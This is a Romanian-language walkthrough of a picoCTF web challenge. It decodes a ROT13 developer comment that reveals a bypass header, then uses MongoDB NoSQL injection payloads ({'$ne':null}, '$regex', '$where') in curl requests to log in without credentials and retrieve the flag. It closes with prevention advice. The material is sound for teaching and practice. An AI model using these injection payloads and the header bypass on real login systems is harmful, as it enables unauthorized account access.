Provocarea ne spune ca suntem in mijloc-ul unei anchete, si se crede ca una din persoanele noastre, ctf player
ascund niste date sensibile in interiorul unui port web *restrictionat*. Au descoperit adresa de e-mail pe care o foloseau
de a se conecta la (ctf-player@picoctf.org). Si ne spune ca nu cunoastem parola, si tehnicile obisnuite de ghicire nu au functionat.
Dar ceva se simte neregula, si este aproape ca si cum dezvoltatorul a lasat o cale secreta. Trebuie sa ne dam seama la asta.

---
**indici si sugesti**

1. Dezvoltatorii lasă uneori note în cod; dar nu întotdeauna în text simplu.

2. Un truc comun este să rotiți fiecare literă cu 13 poziții în alfabet.

---

**Rezolvare**

1. Observam ca dupa ce rulam instanta, ne spune clar ca "Site-ul ruleaza *aici*. 
   Si ne spune daca putem sa ne autentificam.

   Accesand acel site ne duce catre o pagina web numit *Login*, cu un port 58658.
   La acel site ne afiseaza Login cu un *Email:* si o *Password:*
   
   Din acele informati introduc un email random si o parola care ar fi si dau pe butonul "login"
   Dar ne apare cu acest mesaj: Invalid *"credentials"*

2. Sa dam seama ce se afiseaza dincolo de acest site, e sa il inspectam sau sa folosim comanda: *"curl"*
   Ce-l mai simplu e sa folosim comenzi, ca asa e mai frumos cand lucrezi pe terminal, si nu cu "Inspecteaza"
   
   Comanda pe care il putem folosi e aceasta:

                                   curl "http://amiable-citadel.picoctf.net:58658/" | head -60

   Dupa ce ne-a afisat, vedem ca la final dupa *"<body>"*, ne afiseaza acest mesaj:
   
                                      </head>
                                      <body>
                                       <!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
                                       <!-- Remove before pushing to production! -->   
                                       <form id="loginForm">
   
   Din cate putem observa, e un mesaj, si suntem nevoiti sa folosim tool-ul la cyberchef, sa vedem ce ne raspunde acolo
   inainte de a ne duce acolo, vedem ca e codificat in ROT13, dar ramane de vazut.

   Putem folosi aceasta comanda utilizabila:

                                         echo -n "ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" " | rot13

   Si ne afiseaza asta:
 
                                          NOTE: Jack - temporary bypass: use header X-Dev-Access: yes

   Din cate vedem, ne spune ca bypass-ul e temporar, si e folosit in atent, precum "X-Dev-Access: yes"

   Ne gandim la ce vrea sa ne spuna autourl cel care a creat acest site, spunand sa folosim "X-Dev-Acces: yes"
   Atunci hai sa facem ce ne spune, folosim comanda aceasta:
 
                                         curl -H "X-Dev-Access: yes" "http://amiable-citadel.picoctf.net:58658/"

   Si ne afiseaza tot acelasi lucru, cum a fost de la inceput dar faar a mai adauga cu "-H"

   Asa ca trebuie sa analizam ce face si din acel script executabil, ca poate sa ne informeze si acolo ceva,
   Scriptul e aceasta: 
     
                                             <script>
                               document.getElementById('loginForm').addEventListener('submit', function(event) {
                               event.preventDefault();

                                 const formData = {
                                email: document.getElementById('email').value,
                                password: document.getElementById('password').value
                                  };
 
                                  fetch('/login', {
                                 method: 'POST',
                                  headers: {
                                  'Content-Type': 'application/json'
                                    },
                                   body: JSON.stringify(formData)
                                    })
                                    .then(response => response.json())
                                    .then(data => {
                                    console.log(data);
                                   if (data.success) {
                                   prompt('Login successful!\nFlag:', data.flag);
                                  } else {
                                  alert('Invalid credentials');
                                   }

                                   })  
                                   .catch(error => console.error('Error:', error));
                                    });
                                            </script>
 
                               
   Din cate putem vedea, la fetch vedem ceva cu *"/login"*, probabil o pagina web, accesand, doar adaugand cu /login, langa portul "51310"(sau care ar fii), dand enter
   ne afiseaza mesajul acesta: **"Cannot GET /login"**.  Spunand ca "Nu se poate obtine "/login" ", suntem nevoiti sa folosim comanda aceasta:

                                                  curl -H "X-Dev-Access: yes" -X POST "http://amiable-citadel.picoctf.net:51310/login"

   Ne afiseaza: 
       
                                                 {"success":false,"error":"User not found."}                                                                                                                                                                                      

   Observam ca la " {"success":false, "error":"User not found."}, avem un false, ceea ce trebuie sa fie *"true"*.
 

3. Dupa toate informatiile pe care le avem, observ ca functioneaza fara NoSQL injection, iar intr-o aplicatie Node.js cu MongoDB, query-ul de login 
   ar putea arata asa:
 
                                                      {"email": {"$ne": null}, "password": {"$ne": null}}

   $ne înseamnă "not equal" (diferit de)
   Query-ul devine: "găsește un utilizator unde email ≠ null ȘI password ≠ null" 
   Acesta este întotdeauna adevărat pentru orice utilizator care are ambele câmpuri completate!

4. Sa putem rezolva problema, folosim aceasta comanda utila si functionabila:
 
                                                 curl -H "X-Dev-Access: yes" -X POST "http://amiable-citadel.picoctf.net:54439/login" -H "Content-Type: application/json" -d '{"email":{"$ne":null},"password":{"$ne":null}}'

   Si ne afiseaza asta:

                                                  {"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_3e21b3a3}"}

   Dupa rezultat vedem ca ne afiseaza si flag-ul ce dorit

---
#**EXPLICATIE LA COMENZILE PE CARE AM INTRODUS*

                                                    curl -H "X-DEv-Access: yes"

1. Aceasta comanda e luata de la cel care am decodificat acel mesaj in ROT13

                                                    -X POST "http://amiable-citadel.picoctf.net:54439/login"

2. La aceasta comanda cu -X, imrpeuna cu POST e luat dupa scriptul acela de mai sus, daca stati bine si il analizati. Si daca observati, spune si de *'/login"*
   de aceea am introdus acolo in ghilimele cu acel domeniu *"/login"*

                                                     -H "Content-Type: application/json"

3. La asta cu -H "content ..", e tot luat de pe script-ul acela, si daca era altceva introdus acolo, asa trebuia luat si aici, nimic modificat, totul luat si gandit.

                                                     -d '{"email":{"$ne":null},"password":{"$ne":null}}'

4. Iar ultima si nu ce-l din urma, la aceasta comanda "-d '...'", trimite datele, la email dar si la parola, e un algoritm in spatele acelui cod introdus acolo, un caracter gresit, nu va poate rula pana la capat
   {"$ne":null} ---> operator MongoDB care inseamna "diferit de null"


----

Flag : picoCTF{brut4_f0rc4_3e21b3a3}

---
**##Oare de ce a functionat aceasta metoda?**

Validarea input-ului: Serverul valida că email și password sunt string-uri, dar nu verifica dacă sunt obiecte JSON cu operatori MongoDB

Architectural flaw: Serverul pasa input-ul direct în query fără sanitizare

Single user: Probabil exista un singur utilizator în baza de date

Alte metode care ar fi putut funcționa:
                                        
                                              json
                                                {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}}
                                                {"email": {"$exists": true}, "password": {"$exists": true}}
                                                {"$where": "true"}

**Cum să previnem asta?**

Input validation: Verifică că email și password sunt string-uri, nu obiecte
Sanitizare: Folosește biblioteci pentru a preveni NoSQL injection
ORM/ODM: Folosește Mongoose cu schema strictă


**Learning points:**

Always check source code pentru comentarii și indicii
Adapt attack to technology (SQL vs NoSQL vs GraphQL)
Understand error messages - ele oferă indicii despre stack-ul tehnologic
Test different injection vectors când una nu funcționează

---


##**SUCCES :)))**


